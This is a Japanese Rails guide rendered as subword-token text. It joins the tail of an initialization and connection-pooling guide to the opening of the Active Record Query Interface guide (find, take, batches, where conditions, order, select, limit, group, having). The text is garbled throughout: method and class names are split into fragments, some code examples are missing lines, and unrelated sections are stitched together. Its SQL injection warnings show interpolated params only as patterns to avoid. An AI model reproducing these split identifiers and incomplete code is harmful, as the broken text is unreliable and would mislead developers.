▁* ▁` engine s _ blank _ p o in t `: ▁ エンジンの 読み込み が 完了 する 前に 行 いた い 処理 がある場合 に 使用できる 初期化 ポ イン ト への フック を提供します 。
▁ 初期化 処理 が ここ まで 進 む と 、 railties や エンジン イニシャライザ はすべて 起動 しています 。
▁* ▁` add _ g en er at or _ template s `: ▁ アプリケーション や railties や エンジン にある ` lib / template s ` ディレクトリ にある ジェネレータ 用の テンプレート を探し 、 それら を ` config . g en er at or s . template s ` 設定 に追加します 。 この 設定 によって 、 すべての ジェネレータ から テンプレート を参照 できるようになります 。
▁* ▁` en s ur e _ autoload _ on ce _ path s _ as _ sub set `: ▁` config . autoload _ on ce _ path s ` に 、` config . autoload _ path s ` 以外の パス が含まれ ないように します 。
▁ それ以外の パス が含まれ ている 場合は 例外が発生します 。
▁* ▁` add _ to _ prepare _ block s `: ▁ アプリケーション や railties や エンジンの すべての ` config . to _ prepare ` 呼び出し における ブロック が 、 Action ▁D is patch の ` to _ prepare ` に追加 されます 。 Action ▁D is patch は development モード では リクエスト ごとに 実行 され 、 production モード では 最初の リクエスト より 前に 実行されます 。
▁* ▁` add _ b u il t in _ route `: ▁ アプリケーション が development 環境で 動作 している 場合 、` rails / info / pro per t ies ` への ルーティング を アプリケーションの ルーティング に追加します 。
▁この ルーティング にアクセス すると 、 デフォルトの Rails アプリケーションで ` public / index . html ` に 表示される の と同様 の詳細 情報 ( Rails や Ruby のバージョン など ) が表示されます 。
▁* ▁` build _ middleware _ st ack `: ▁ アプリケーションの ミドルウェアスタック を 構成 し 、` c all ` メソッド を持つ オブジェクト を返します 。 この ` c all ` メソッドは 、 リクエスト に対する Rack 環境 の オブジェクトを 引数に 取り ます 。
▁* ▁` eager _ load !` : ▁` config . eager _ load ` が true に 設定 されている 場合 、` config . before _ eager _ load ` フック を実行し 、 続いて ` eager _ load !` を呼び出します 。 この 呼び出し により 、 すべての ` config . eager _ load _ name space s ` が 呼び出され ます 。
▁* ▁` f in is her _ h oo k `: ▁ アプリケーションの 初期化 プロセス 完了 後に 実行される フック を 提供し 、 アプリケーション や railties や エンジンの ` config . after _ initialize ` ブロック も すべて 実行 します 。
▁* ▁` set _ routes _ reload er `: ▁` ActionDispatch :: Callbacks . to _ prepare ` を使用して ルーティング を 再 読み込み するために Action ▁D is patch を 構成 します 。
▁* ▁` d is able _ dependency _ load ing `: ▁` config . eager _ load ` が true の場合は 自動 依 存 性 読み込み ( auto ma tic ▁ dependency ▁ load ing ) を 無効 に します 。
▁ データベース 接続 を プ ー ル する
▁ ----------------
▁Active ▁Record の データベース 接続 は ` ActiveRecord :: Connection A d a p ter s :: Connection P o ol ` によって 管理 されます 。 これは 、 接続 数 に 限 り のある データベース 接続 にアクセス する 際 の ス レ ッ ド 数 と 接続 プ ー ル が 同 期 する ように する ものです 。
▁ 最大 接続 数 はデフォルトで 5 ですが 、` database . yml ` で カスタマイズ 可能です 。
▁ 接続 プ ー ル はデフォルトで は Active ▁Record で 取り 扱 わ れる ため 、 アプリケーション サーバー の動作 は 、 T h in や m on g re l や U n i c or n など ど れ であっても 同じ 振る舞い になります 。
▁ 最 初 は データベース 接続 の プ ー ル は 空 で 、 必要に応じて 追加 接続 が作成され 、 接続 プ ー ル の 上 限 に 達 する まで 接続 が追加され ます 。
▁1 つの リクエスト の中で の 接続 は 常に 次のような 流れ になります : ▁ 初 回 は データベース アクセス の 必要な 接続 を 確 保 し 、 以後 は その 接続 がある ことを 再 確認 します 。 リクエスト の 終わり では 、 キュー で 待 機 する 次 以降 の リクエスト に 備 え て 接続 ス ロ ッ ト が 追加 で 利用 できるようになります 。
▁ 利用 可能な 数 よりも 多くの 接続 を使用し よう と すると 、 Active ▁Record は 接続 を ブロック し 、 プ ー ル から の 接続 を 待 ち ます 。
▁ 接続 が 行 え な くなる と 、 以下のような タ イ ム ア ウ ト エラー が ス ロー されます 。
▁ActiveRecord :: Connection Time out Error ▁- ▁ co ul d ▁ not ▁ o b t a in ▁a ▁ database ▁ connect ion ▁with in ▁5 ▁ sec on d s .
▁ The ▁ ma x ▁ p o ol ▁ size ▁is ▁ current ly ▁5 ; ▁ con s id er ▁in c re as ing ▁it :
▁上の エラー が発生する ような 場合は 、` database . yml ` の ` p o ol ` オプション の 数値 を 増 や して 接続 プ ー ル の サイズ を 増 や す ことで 対応 できます 。
▁NOT E : ▁ アプリケーションを マ ル チ ス レ ッ ド 環境で 実行 している 場合 、 多くの ス レ ッ ド が 多くの 接続 に 同 時 アクセス する 可能性があります 。
▁ 現 時点 の リクエスト の 負 荷 によって は 、 限 られ た 接続 数 を 多数の ス レ ッ ド が 奪 い 合 う ようなこと になる かもしれません 。
▁` ` ` ruby
▁=> ▁true
▁Active ▁Record ▁ クエリ インターフェイス
▁= = ========= ========= =========
▁この ガイド では 、 Active ▁Record を使用して データベースから データを 取り出す ための さまざまな 方法 について解説します 。
▁* ▁ 多くの メソッド や 条件 を 駆 使 して レコード を検索する
▁* ▁ 検索 された レコード の ソ ート 順 、 取り出し たい 属性 、 グループ 化 の 有 無 など を指定する
▁* ▁ 一 括 読み込み ▁( eager ▁ load ing ) ▁ を使用して 、 データ 取り出し に 必要な クエリ の 実行 回 数 を 減 ら す
▁* ▁ 動的 検索 メソッド を使用する
▁* ▁ 特定の レコード が存在する かどうか をチェックする
▁* ▁Active ▁Record モデル で さまざまな 計算 を行う
▁* ▁ リレーション で E X P L A IN を実行する
▁ 生 の SQL を使用して データベースの レコード を検索する ことに 慣 れ き った 人 が Rails に 出 会 う と 、 Rails では 同じ 操作 を ず っ と 洗 練 された 方法で 実現 できる ことに 気 付 く でしょう 。
▁Active ▁Record を使用することで 、 SQL を 直 に 実行 する 必要 は ほぼ なくなります 。
▁ 本 ガイド のコード 例 では 、 基本的に 以下の モデル を使用します 。
▁ TIP : ▁ 特に 記 さ ない 限 り 、 モデル 中 の ` id ` は 主キー を表し ます 。
▁class ▁Client ▁< ▁ActiveRecord :: Base
▁has _ one ▁: address
▁has _ many ▁: orders
▁has _ and _ belongs _ to _ many ▁: r ol es
▁class ▁A d d r ess ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: client
▁class ▁ Order ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: client , ▁ counter _ cache : ▁true
▁class ▁ R ol e ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: client s
▁Active ▁Record は 、 ユーザーに 代 わ って データベースに クエリ を 発 行 します 。 発 行 される クエリ は 多くの データベース システム ▁( MySQL 、 PostgreSQL 、 SQLite など ) ▁ と 互 換 性 があります 。
▁Active ▁Record を使用し ていれば 、 利用 している データベース システム の 種類 に か か わ らず 、 同じ 表 記 を使用できます 。
▁ データベースから オブジェクトを 取り出す
▁--------- ----------- ----------------
▁Active ▁Record では 、 データベースから オブジェクトを 取り出す ための 検索 メソッドを 多 数 用 意 しています 。
▁これらの 検索 メソッド を使用することで 、 生 の SQL を 書くこと なく 、 データベース への 特定の クエリ を実行する ための 引数 を 渡す ことができます 。
▁以下の メソッドが 用意されてい ます 。
▁* ▁` bin d `
▁* ▁` create _ with `
▁* ▁` d ist in ct `
▁* ▁` eager _ load `
▁* ▁` ext end ing `
▁* ▁` from `
▁* ▁` group `
▁* ▁` ha v ing `
▁* ▁` include s `
▁* ▁` join s `
▁* ▁` limit `
▁* ▁` lock `
▁* ▁` n one `
▁* ▁` of f set `
▁* ▁` order `
▁* ▁` p reload `
▁* ▁` read only `
▁* ▁` ref er en ce s `
▁* ▁` re order `
▁* ▁` reverse _ order `
▁* ▁` select `
▁* ▁` un i q `
▁* ▁` where `
▁上の メソッドは 、 すべて ` ActiveRecord :: Re l ation ` の インスタンス を返します 。
▁` Model . find ( options ) ` という 操作 を 要 約 すると 以下の ようになります 。
▁* ▁ 与えられた オプションを 同 等 の SQL クエリ に変換 します 。
▁* ▁ SQL クエリ を 発 行 し 、 該当する 結果を データベースから 取り出し ます 。
▁* ▁ 得られ た 結果を 行 ごとに 同 等 の Ruby オブジェクト として インスタンス 化 します 。
▁### ▁ 単 一 の オブジェクトを 取り出す
▁Active ▁Record には 、 単 一 の オブジェクトを 取り出す ための さ ま ざ ま 方法 が 用意されてい ます 。
▁#### ▁` find `
▁` find ` メソッドを使用すると 、 与えられた どの オプション にも マッチする ▁ _ 主キー _ ▁ に対応する オブジェクトを 取り出す ことができます 。
▁ 以下 に 例 を示します 。
▁# ▁F in d ▁the ▁ client ▁with ▁ primary ▁ key ▁( id ) ▁10 .
▁ client ▁= ▁Client . find ( 10 )
▁# ▁=> ▁#< Client ▁id : ▁10 , ▁ first _ name : ▁" Ryan ">
▁これ と 同 等 の SQL は以下のようになります 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . id ▁= ▁10 ) ▁LIMIT ▁1
▁` find ` メソッドで マッチする レコード が 見つからない 場合 、` ActiveRecord :: Re c or d No t F ound ` 例外が発生します 。
▁この メソッドを使用して 、 複数の オブジェクト への クエリ を作成する こともできます 。
▁これ を行う には 、` find ` メソッドの 呼び出し 時に 主キー の配列 を 渡します 。
▁これにより 、 与えられた ▁ _ 主キー _ ▁ に マッチする レコード をすべて 含 む 配列 が返されます 。
▁# ▁F in d ▁the ▁clients ▁with ▁ primary ▁ keys ▁1 ▁and ▁10 .
▁ client ▁= ▁Client . find ( [ 1 , ▁10 ] ) ▁# ▁Client . find ( 1 , ▁10 ) でも よい
▁# ▁=> ▁[ # < Client ▁id : ▁1, ▁ first _ name : ▁" L if o "> , ▁#< Client ▁id : ▁10 , ▁ first _ name : ▁" Ryan "> ]
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . id ▁ IN ▁( 1 , 10 ) )
▁WARN ING : ▁` find ` メソッドで 与えられた 主キー の中に 、 どの レコード にも マッチ しない 主キー が ** 1 つ でも ** ある と 、` ActiveRecord :: Re c or d No t F ound ` 例外が発生します 。
▁#### ▁` t a ke `
▁` t a ke ` メソッドは レコード を 1 つ 取り出し ます 。 どの レコード が 取り 出 される か は 指定 されません 。
▁ client ▁= ▁Client . t a ke
▁# ▁=> ▁#< Client ▁id : ▁1, ▁ first _ name : ▁" L if o ">
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁1
▁` Model . t a ke ` は 、 モデルに レコード が 1 つ も ない場合 に ` nil ` を返します 。 このとき 例外 は 発生 しません 。
▁` t a ke ` メソッドで 返す レコード の 最大 数 を 数値 の 引数 で 指定 することもできます 。
▁ 例 :
▁ client ▁= ▁Client . t a ke (2)
▁# ▁=> ▁[
▁#< Client ▁id : ▁1, ▁ first _ name : ▁" L if o "> ,
▁#< Client ▁id : ▁ 22 0, ▁ first _ name : ▁" S ar a ">
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁2
▁ TIP : ▁このメソッド で 取り 出 される レコード は 、 使用する データベース エンジン によって も 異なる ことがあります 。
▁#### ▁` first `
▁` first ` メソッドは 、 主キー 順 の最初の レコード を取り出し ます 。
▁ client ▁= ▁Client . first
▁ SELECT ▁* ▁FROM ▁clients ▁OR D ER ▁BY ▁clients . id ▁A S C ▁LIMIT ▁1
▁` first ` メソッドは 、 モデルに レコード が 1 つ も ない場合 に ` nil ` を返します 。 このとき 例外 は 発生 しません 。
▁` first ` メソッドで 返す レコード の 最大 数 を 数値 の 引数 で 指定 することもできます 。
▁ 例 :
▁ client ▁= ▁Client . first ( 3 )
▁#< Client ▁id : ▁ 2, ▁ first _ name : ▁" F if o "> ,
▁#< Client ▁id : ▁ 3, ▁ first _ name : ▁" F il o ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR D ER ▁BY ▁clients . id ▁A S C ▁LIMIT ▁3
▁` first !` メソッド の動作 は 、 マッチする レコード が 見つからない 場合に ` ActiveRecord :: Re c or d No t F ound ` 例外 が発生する 点 を 除 いて 、` first ` メソッドと まったく 同じです 。
▁#### ▁` last `
▁` last ` メソッドは 、 主キー 順 の 最後の レコード を取り出し ます 。
▁ client ▁= ▁Client . last
▁# ▁=> ▁#< Client ▁id : ▁ 22 1 , ▁ first _ name : ▁" R us s e l ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR D ER ▁BY ▁clients . id ▁D E S C ▁LIMIT ▁1
▁ last ` メソッドは 、 モデルに レコード が 1 つ も ない場合 に ` nil ` を返します 。 このとき 例外 は 発生 しません 。
▁` last ` メソッドで 返す レコード の 最大 数 を 数値 の 引数 で 指定 することもできます 。
▁ client ▁= ▁Client . last ( 3 )
▁#< Client ▁id : ▁2 19 , ▁ first _ name : ▁" J am es "> ,
▁#< Client ▁id : ▁ 22 0, ▁ first _ name : ▁" S ar a "> ,
▁#< Client ▁id : ▁ 22 1 , ▁ first _ name : ▁" R us s e l ">
▁ SELECT ▁* ▁FROM ▁clients ▁OR D ER ▁BY ▁clients . id ▁D E S C ▁LIMIT ▁3
▁` last !` メソッド の動作 は 、 マッチする レコード が 見つからない 場合に ` ActiveRecord :: Re c or d No t F ound ` 例外 が発生する 点 を 除 いて 、` last ` メソッドと まったく 同じです 。
▁#### ▁` find _ by `
▁` find _ by ` メソッドは 、 与えられた 条件 に マッチする レコード のうち 最初の レコード だけ を返します 。
▁Client . find _ by ▁ first _ name : ▁' L if o '
▁Client . find _ by ▁ first _ name : ▁' J on '
▁# ▁=> ▁nil
▁上の 文 は 以下のように 書く こともできます 。
▁Client . where ( first _ name : ▁' L if o ') . t a ke
▁` find _ by !` メソッド の動作 は 、 マッチする レコード が 見つからない 場合に ` ActiveRecord :: Re c or d No t F ound ` 例外 が発生する 点 を 除 いて 、` find _ by ` メソッドと まったく 同じです 。
▁Client . find _ by !
▁ first _ name : ▁' do es ▁ not ▁ ex ist '
▁# ▁=> ▁ActiveRecord :: Re c or d No t F ound
▁上の 文 は 以下のように 書く こともできます 。
▁Client . where ( first _ name : ▁' do es ▁ not ▁ ex ist ') . t a ke !
▁### ▁ 複数の オブジェクトを バ ッ チ で 取り出す
▁ 多数の レコード に対して 反 復 処理 を行い たい ことがあります 。 たとえば 、 多くの ユーザーに ニ ュ ー ス レ ター を送信し たい 、 データを エ ク ス ポート したい など です 。
▁ このような 処理 を そのまま 実装 すると 以下のように な る でしょう 。
▁# ▁ このような 処理 を 数 千 件 もの レコード に対して 実行 すると 、 効率 が 大 幅 に 低 下 します 。
▁User . all . each ▁do ▁| user |
▁ New s Mailer . week ly ( user ). deliver _ now
▁しかし 上 のような 処理 は 、 テーブル の サイズ が 大きく な る に つ れ て 非 現 実 的 になります 。 ` User . all . each ` は 、 Active ▁Record に対して ▁ _ テーブル 全体 _ ▁ を 一度 に 取り出し 、 しか も 1 行 ごとに オブジェクト を生成し 、 その 巨 大 な モデル オブジェクト の配列 を メモリ に 配置 する からです 。
▁ も し 莫 大 な 数 の レコード に対して このような コードを ま とも に 実行 すると 、 コレクション 全体 の サイズ が メモリ 容 量 を 上 回 っ てしまう ことでしょう 。
▁Rails では 、 メモリ を 圧 迫 しない サイズ に バ ッ チ を 分割 して 処理 するための 方法 を 2 とおり 提供し ています 。
▁1 つ 目 は ` find _ each ` メソッド を使用する 方法 です 。 これは 、 レコード の バ ッ チ を 1 つ 取り出し 、 次に ▁ _ 各 _ ▁ レコード を 1 つの モデル として 個 別 に ブロック に yield します 。
▁2 つ目の 方法は ` find _ in _ b at ch es ` メソッド を使用する 方法 です 。 レコード の バ ッ チ を 1 つ 取り出し 、 次に ▁ _ バ ッ チ 全体 _ ▁ を モデル の配列 として ブロック に yield します 。
▁ TIP : ▁` find _ each ` メソッドと ` find _ in _ b at ch es ` メソッドは 、 一度 に メモリ に 読み 込 め ない ような 大 量 の レコード に対する バ ッ チ 処理 の ためのものです 。
▁ 数 千 の レコード に対して 単 に ル ー プ 処理 を行なう のであれば 通常の 検索 メソッドで 十分 です 。
▁#### ▁` find _ each `
▁` find _ each ` メソッドは 、 レコード の バ ッ チ を 1 つ 取り出し 、 続いて ▁ _ 各 _ ▁ レコード を 1 つの モデル として 個 別 に ブロック に yield します 。
▁以下の 例 では 、` find _ each ` で 1 000 件 の レコード を取り出し ています 。 この 件 数 は ` find _ each ` と ` find _ in _ b at ch es ` の どちら でも デフォルト値 として 使用 され ており 、 続いて 各 レコード を 1 つの モデル として ブロック に 個 別 に yield します 。
▁この 処理 は 、 すべての レコード が 処理 される まで 繰 り 返 されます 。
▁User . find _ each ▁do ▁| user |
▁` find _ each ` では 、` where ` などの Active ▁Record メソッドを 連 鎖 ▁( cha in ) ▁ させる ことで 条件 を追加する ことができます 。
▁User . where ( week ly _ sub sc ri b er : ▁true ). find _ each ▁do ▁| user |
▁#### # ▁` find _ each ` の オプション
▁` find _ each ` メソッド では 、 通常の ` find ` メソッドと ほぼ 同じ オプション が 使用できます 。 `: order ` と `: limit ` は ` find _ each ` 内部で 利用 するために 予 約 され ており 、 使用 できません 。
▁** `: b at ch _ size ` **
▁`: b at ch _ size ` オプションは 、 ( ブロック に 個 別 に渡され る 前に ) ▁1 回 の バ ッ チ で 取り出す レコード 数 を指定します 。
▁たとえば 、 1 回 に 5 000 件 ず つ 処理 したい場合は 以下のように 指定 します 。
▁User . find _ each ( b at ch _ size : ▁5 000 ) ▁do ▁| user |
▁ デフォルトで は 、 レコード は 主キー の 昇 順に 取り 出 されます 。 主キー は 整 数 で なければなりません 。
▁これは 、 たとえば 中 断 した バ ッ チ 処理 を 再 開 する 場合 など に 便利です ▁( 最後に 実行 された 処理 の ID が チェック ポ イン ト として 保存 済み であること が 前 提 です )。
▁たとえば 、 1 回 の バ ッ チ で 5 000 件 を取り出し 、 主キー が 2 000 以降 のユーザー だけ に ニ ュ ー ス レ ター を送信し たい場合は 以下のように します 。
▁#### ▁` find _ in _ b at ch es `
▁` find _ in _ b at ch es ` メソッドは 、 レコード を バ ッ チ で 取り出す という 点 で ` find _ each ` と似ています 。
▁ 違 う のは 、` find _ in _ b at ch es ` は ▁ _ バ ッ チ _ ▁ を 個 別 に ではなく モデル の配列 として ブロック に yield する という 点 です 。
▁以下の 例 では 、 与えられた ブロック に対して 一度 に 最大 1 000 まで の 納 品 書 ▁( in v o i ce ) ▁ の配列 を yield しています 。 最後の ブロック には 残 り の 納 品 書 が含まれ ます 。
▁# ▁1 回 あ たり add _ in v o i ce s に 納 品 書 1 000 通 の配列 を 渡す
▁ In v o i ce . find _ in _ b at ch es ▁do ▁| in v o i ce s |
▁ ex port . add _ in v o i ce s ( in v o i ce s )
▁#### # ▁` find _ in _ b at ch es ` の オプション
▁ options
▁ 条件
▁--------- -
▁` where ` メソッドは 、 返される レコード を 制限 するための 条件 を指定します 。 SQL 文 で言う ` W H ER E ` の 部分 に相当 します 。
▁ 条件 は 、 文字列 、 配列 、 ハッシュ のいずれか の 方法で 与え ることができます 。
▁### ▁ 文字列 だけで 表 された 条件
▁ 検索 メソッド に 条件 を 追加 したい場合 、 たとえば ` Client . where (" orders _ count ▁= ▁' 2 ' ") ` のように 条件 を 単 純 に 指定 することができます 。
▁ この場合 、` orders _ count ` フィールド の 値が 2 である すべての クライアント が 検索 されます 。
▁WARN ING : ▁ 条件 を 文字列 だけで 構成 すると 、 SQL インジェクション の 脆弱性 が発生する 可能性があります 。
▁たとえば 、` Client . where (" first _ name ▁ L I K E ▁' % # { params [: first _ name ]} % ' ") ` という 書き 方は 危 険 です 。
▁ 次 で 説明 する ように 、 配列 を使用する の が 望 ま しい 方法 です 。
▁### ▁ 配列 で 表 された 条件
▁ 条件 で使用する 数値 が 変 動 する 可能性 がある場合 、 引数 を どのように すれば よいでしょう か 。
▁ この場合は 以下のように します 。
▁Client . where (" orders _ count ▁= ▁ ? ", ▁ params [: orders ] )
▁Active ▁Record は 条件 値 の最初の 要素 を調べ 、 その後 に 要素 が追加され ていた ら 、 最初の 要素 の中に ある 疑問符 ` ( ? ) ` を 追加 要素 で 置き換え ます 。
▁ 複数の 条件 を 指定 したい場合は 次のように します 。
▁ AND ▁ lock ed ▁= ▁ ? ", ▁ params [: orders ] , ▁false )
▁上の 例 では 、 1 つ目の 疑問符 は ` params [: orders ] ` の値 で 置き換え られ 、 2 つ目の 疑問符 は ` false ` を SQL 形式 に変換 した もの ▁( 変 換 方法は ア ダ プ タ によって 異なる ) ▁ で 置き換え られます 。
▁ 以下のような コードの 書き 方 を 強 く 推 奨 します 。
▁以下の 書き 方は 危 険 であり 、 避 け る必要があります 。
▁Client . where (" orders _ count ▁= ▁# { params [: orders ]} ")
▁ 条件 文字列 の中に 変数 を直接 置 く と 、 その 変数 は データベースに ▁** そのまま ** ▁ 渡 され てしまいます 。
▁これは 、 悪意のある 人 物 が エスケープ されていない 危 険 な 変数 を 渡す ことができる ということです 。
▁ このような コード がある と 、 悪意のある 人 物 が データベース を 意 の ま ま にする ことができ 、 データベース 全体 が 危 険 に さ ら されます 。
▁ く れ ぐ れ も 、 条件 文字列 の中に 引数 を直接 置 く ことは しないでください 。
▁ TIP : ▁ SQL インジェクション の詳細については [ Ruby ▁on ▁Rails セキュリティ ガイド ]( security . html # sql インジェクション ) を参照してください 。
▁#### ▁ プ レ ー ス ホ ル ダ を使用した 条件
▁ 疑問符 ` ( ? ) ` を パラメータ で 置き換え る スタイル と同様 、 配列 による 条件 中 で キー / 値 の ハッシュ を 指定できます 。
▁Client . where (" created _ at ▁ > = ▁: start _ date ▁ AND ▁ created _ at ▁< = ▁: end _ date ",
▁ { start _ date : ▁ params [: start _ date ] , ▁end _ date : ▁ params [: end _ date ] })
▁この ように 書くこと で 、 条件 で 多数の 変数 が 使用されている 場合に コードが 読み や す く なります 。
▁### ▁ ハッシュ を使用した 条件
▁Active ▁Record は 条件 を ハッシュ で 渡す こともできます 。 この 書 式 を使用することで 条件 構 文 が 読み や す く なります 。
▁ 条件 を ハッシュ で 渡す 場合 、 ハッシュの キー には 条件 付け したい フィールド を 、 ハッシュ の値 には その フィールド を どのように 条件 づ け するか を 、 それぞれ 指定 します 。
▁NOT E : ▁ ハッシュ による 条件 は 、 等 値 、 範囲 、 サブ セット の チェック で のみ 使用できます 。
▁#### ▁ 等 値 条件
▁Client . where ( lock ed : ▁true )
▁ フィールド 名 は 文字列 形式 に することもできます 。
▁Client . where (' lock ed ' ▁=> ▁true )
▁ belongs _ to リレーションシップ の場合 、 Active ▁Record オブジェクトが 値 として 使用 され ていれば 、 モデル を指定する 時に 関連付け キー を使用できます 。
▁この 方法は ポリモーフィック リレーションシップ で も同様に 使用できます 。
▁Article . where ( author : ▁ author )
▁A u th or . join s (: articles ). where ( articles : ▁ { ▁ author : ▁ author ▁ })
▁NOT E : ▁この 値 は シンボル にする ことはできません 。
▁たとえば ` Client . where ( status : ▁: active ) ` のような 書き 方は できません 。
▁#### ▁ 範囲 条件
▁Client . where ( created _ at : ▁( Time . now . m id n ig h t ▁- ▁1. day ). .
▁上の 例 では 、 昨 日 作成された すべての クライアント を 検索 します 。 内部で は SQL の ` B E T W EEN ` 文 が使用されます 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . created _ at ▁B E T W EEN ▁' 200 8 - 12 - 2 1 ▁ 00 : 00 : 00 ' ▁ AND ▁' 200 8 - 12 - 22 ▁ 00 : 00 : 00 ')
▁[ 配列 で 表 された 条件 ]( # 配列 で 表 された 条件 ) では 、 さらに 簡潔 な 文 例 を ご 紹 介 しています 。
▁#### ▁ サブ セット 条件
▁ SQL の ` IN ` 式 を使用して レコード を 検索 したい場合 、 条件 ハッシュ に そのため の配列 を 1 つ 渡す ことができます 。
▁Client . where ( orders _ count : ▁[1, 3, 5 ] )
▁上のコード を実行すると 、 以下のような SQL が 生成されます 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . orders _ count ▁ IN ▁( 1 , 3, 5 ) )
▁### ▁NOT 条件
▁ SQL の ` N O T ` クエリ は 、` where . not ` で 表 せ ます 。
▁Article . where . not ( author : ▁ author )
▁ 言 い 換 え れば 、 この クエリ は ` where ` に 引数 を 付け ずに 呼び出し 、 直 後に ` where ` 条件 に ` not ` を渡して 連 鎖 させる こと によって 生成 されています 。
▁ 並 び 順
▁ データベースから 取り出す レコード を 特定の 順序 で 並 べ 替 え たい 場合 、` order ` を使用できます 。
▁たとえば 、 ひ と か た まり の レコード を取り出し 、 それ を テーブル 内の ` created _ at ` の 昇 順 で 並 べ たい 場合には 以下のように します 。
▁Client . order (: created _ at )
▁Client . order (" created _ at ")
▁` A S C ` ( 昇 順 ) や ` D E S C ` ( 降 順 ) を指定する こともできます 。
▁Client . order ( created _ at : ▁: de sc )
▁Client . order ( created _ at : ▁: as c )
▁Client . order (" created _ at ▁D E S C ")
▁Client . order (" created _ at ▁A S C ")
▁ 複数の フィールド を指定して 並 べ る こともできます 。
▁Client . order ( orders _ count : ▁: as c , ▁ created _ at : ▁: de sc )
▁Client . order (: orders _ count , ▁ created _ at : ▁: de sc )
▁Client . order (" orders _ count ▁A S C , ▁ created _ at ▁D E S C ")
▁Client . order (" orders _ count ▁A S C ", ▁" created _ at ▁D E S C ")
▁Client . order (" orders _ count ▁A S C ") . order (" created _ at ▁D E S C ")
▁# ▁ SELECT ▁* ▁FROM ▁clients ▁OR D ER ▁BY ▁ orders _ count ▁A S C , ▁ created _ at ▁D E S C
▁ 特定の フィールド だけ を 取り出す
▁ デフォルトで は 、` Model . find ` を実行すると 、 結果 セット から すべての フィールド が 選択 されます 。 内部 的に は SQL の ` select ▁* ` が 実行 されています 。
▁ 結果 セット から 特定の フィールド だけ を取り出し たい 場合 、` select ` メソッド を使用できます 。
▁たとえば 、` view able _ by ` カラム と ` lock ed ` カラム だけ を取り出し たい場合は 以下のように します 。
▁Client . select (" view able _ by , ▁ lock ed ")
▁ 上で 実際に 使用される SQL 文 は以下のようになります 。
▁ SELECT ▁ view able _ by , ▁ lock ed ▁FROM ▁clients
▁ select を使用すると 、 選択 した フィールド だけ を使用して モデル オブジェクトが 初期化 される ため 、 注意 してください 。
▁ モデル オブジェクトの 初期化 時に 指定 し なかった フィールド にアクセス し よう と すると 、 以下の メッセージ が表示されます 。
▁` ` ` b a sh
▁` < 属性 名 > ` は 、 アクセス し よう と した 属性 です 。
▁` id ` メソッドは 、 この ` ActiveRecord :: M is s ing A tt ri b u te Error ` を 発生 しません 。 このため 、 関連付け を扱う 場合には 注意 してください 。 関連付け が 正常に 動作する には ` id ` メソッドが 必要 だ からです 。
▁ 特定の フィールド について 、 重複 の ない 一意 の 値を 1 レコード だけ 取り出し たい 場合 、` d ist in ct ` を使用できます 。
▁Client . select (: name ). d ist in ct
▁上のコード を実行すると 、 以下のような SQL が 生成されます 。
▁ SELECT ▁D I S T IN C T ▁name ▁FROM ▁clients
▁ 一意性 の 制 約 を 外 す こともできます 。
▁ query ▁= ▁Client . select (: name ). d ist in ct
▁# ▁=> ▁ 重複 の ない 一意 の名前 が 返される
▁ query . d ist in ct ( false )
▁# ▁=> ▁ 重複 の 有 無 を 問 わ ず すべての 名前 が 返される
▁ L im it と O f f set
▁` Model . find ` で 実行される SQL に ` L I M I T ` を 適 用 したい場合 、 リレーション で ` limit ` メソッドと ` of f set ` メソッド を使用することで ` L I M I T ` を 指定できます 。
▁` limit ` メソッドは 、 取り出す レコード 数 の 上 限 を指定します 。 ` of f set ` は 、 レコード を返す 前に スキップ する レコード 数 を指定します 。
▁Client . limit ( 5 )
▁ 上 を実行すると クライアント が 最大 で 5 つ 返 されます 。 オフ セット は 指定 されていない ので 、 最初の 5 つ が テーブル から 取り 出 されます 。
▁この 時 実行される SQL は 以下のような感じ になります 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5
▁` of f set ` を追加する と 以下の ようになります 。
▁Client . limit ( 5 ). of f set ( 30 )
▁上のコードは 、 最初の 30 クライアント を スキップ して 3 1 人 目 から 最大 5 人 の クライアント を返します 。
▁このとき の SQL は以下のようになります 。
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁5 ▁ O F F S E T ▁ 30
▁ グループ
▁- ----
▁ 検索 メソッドで 実行される SQL に ` G R O U P ▁BY ` 句 を追加し たい場合は 、` group ` メソッドを 検索 メソッド に追加 できます 。
▁たとえば 、 注文 ▁( order ) ▁ の作成 日 の コレクション を 検索 したい場合は 、 以下のように します 。
▁ Order . select (" date ( created _ at ) ▁as ▁ order ed _ date , ▁ sum ( p ri ce ) ▁as ▁to t al _ p ri ce ") . group (" date ( created _ at ) ")
▁上のコードは 、 データベース で 注文 のある 日付 ごとに ` Order ` オブジェクトを 1 つ 作成 します 。
▁ 上で 実行される SQL は 以下のような もの になります 。
▁ SELECT ▁ date ( created _ at ) ▁as ▁ order ed _ date , ▁ sum ( p ri ce ) ▁as ▁to t al _ p ri ce
▁FROM ▁ orders
▁GR O U P ▁BY ▁ date ( created _ at )
▁### ▁ グループ 化 された 項目 の 合 計
▁ グループ 化 した 項目 の 合 計 を ひとつ の クエリ で 得 る には 、` group ` の 次に ` count ` を呼び出します 。
▁ Order . group (: status ). count
▁# ▁=> ▁ { ▁' a w a it ing _ app r o v al ' ▁=> ▁ 7 , ▁' p a id ' ▁=> ▁ 12 ▁ }
▁ SELECT ▁C O U N T ▁( * ) ▁A S ▁ count _ all , ▁ status ▁A S ▁ status
▁FROM ▁" orders "
▁GR O U P ▁BY ▁ status
▁ H a v ing
▁-- ----
▁ SQL では 、` G R O U P ▁BY ` フィールド で 条件 を指定する 場合に ` H A V ING ` 句 を使用します 。
▁ Order . select (" date ( created _ at ) ▁as ▁ order ed _ date , ▁ sum ( p ri ce ) ▁as ▁to t al _ p ri ce ") .
▁ group (" date ( created _ at ) ") . ha v ing (" sum ( p ri ce ) ▁ > ▁ ? ", ▁ 100 )
▁ H A V ING ▁ sum ( p ri ce ) ▁ > ▁ 100
